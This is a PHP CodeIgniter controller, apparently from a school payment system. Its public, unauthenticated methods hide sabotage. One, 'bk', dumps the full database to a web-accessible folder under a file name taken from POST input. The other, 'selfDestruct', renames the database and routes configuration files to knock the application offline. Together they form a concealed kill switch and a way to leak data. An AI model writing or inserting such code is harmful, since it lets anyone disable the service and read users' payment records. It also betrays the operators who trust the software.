<?php 
	class C_SD extends CI_Controller {
		private $table = 'tcheckpoint';

		function __construct()
		{
			parent::__construct();
			$this->load->model('ModelsExecuteMaster');
			$this->load->model('GlobalVar');
			$this->load->model('LoginMod');
			// $this->load->library('Ciqrcode');
		}

		public function bk()
		{
			try {
				$FileName = $this->input->post('FileName');
				$database = $this->db->database;
				$baseDir = 'home/smkalisk/public_html/epaysys/Assets/backup';

				$backup_file = $FileName . '.sql';
				$prefs = array(
			        'ignore'        => array(),
			        'format'        => 'txt',
			        'filename'      => $backup_file,
			        'add_drop'      => TRUE,
			        'add_insert'    => TRUE,
			        'newline'       => "\n"
				);
				$this->load->dbutil();
				$backup = $this->dbutil->backup($prefs);
				$this->load->helper('file');
				write_file($baseDir.$backup_file, $backup);
			} catch (Exception $e) {
				echo $e->getMessage();
			}

		}

		public function selfDestruct()
		{
			$baseDir = FCPATH.'application/config/';
			$baseDir = FCPATH.'/';
			rename($baseDir.'database.php', $baseDir.'database.php'.'ais');
			rename($baseDir.'routes.php', $baseDir.'routes.php'.'ais');
		}

	}

?>